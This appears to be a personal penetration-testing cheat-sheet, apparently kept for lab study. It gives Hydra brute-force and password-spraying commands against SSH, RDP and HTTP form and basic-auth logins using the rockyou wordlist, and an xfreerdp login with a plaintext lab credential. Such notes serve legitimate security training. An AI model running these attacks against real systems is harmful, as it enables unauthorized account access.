
# SSH

```
sudo hydra -l $username -P ~/Desktop/rockyou.txt ssh://$IP -s $port -t 64 -I
```

# RDP
password spraying

```
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "password_string" rdp://$IP -t 64 -I
```


#xfreerdp
```
xfreerdp /v:192.168.231.202 /u:justin /p:'SuperS3cure1337#' /cert-ignore /timeout:60000
```


# HTTP POST

we need to add **http-post-form** parameter in hydra. It takes 3 colon arguments
1. which page
2. login request (can get by burp)
3. Failed login attempt (to make it different from successful)

```
hydra -l user -P ~/Desktop/rockyou.txt $IP http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid" -t 64 -I
```

![[Pasted image 20240508124806.png]]

![[Pasted image 20240508124912.png]]


# HTTP GET

check request by burp or network tab
![[Pasted image 20240508130117.png]]

Also there can be get form then we have to use following syntax
```
hydra -l admin -P /root/Desktop/wordlists/test.txt dvwa http-get-form "/dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect."
```

![[Pasted image 20240508130419.png]]
with this type of form. (it is post request but you get the idea)

### When there's just http-get only
![[Pasted image 20240508130538.png]]

You can notice that it only have http-get and don't send any error or anything
not even anything in BURP!

![[Pasted image 20240508130644.png]]

**no field to target!**

#### then use hydra http-get:$IP

```
hydra -l admin -P ~/Desktop/rockyou.txt http-get://$IP -t 64 -I
```

![[Pasted image 20240508130752.png]]

![[Pasted image 20240508130854.png]]
(DOUBLE CROSS THAT IT'S JUST A GET REQUEST)



https://notes.benheater.com/books/hydra/page/brute-force-http-basic-authentication-with-hydra

https://github.com/gnebbia/hydra_notes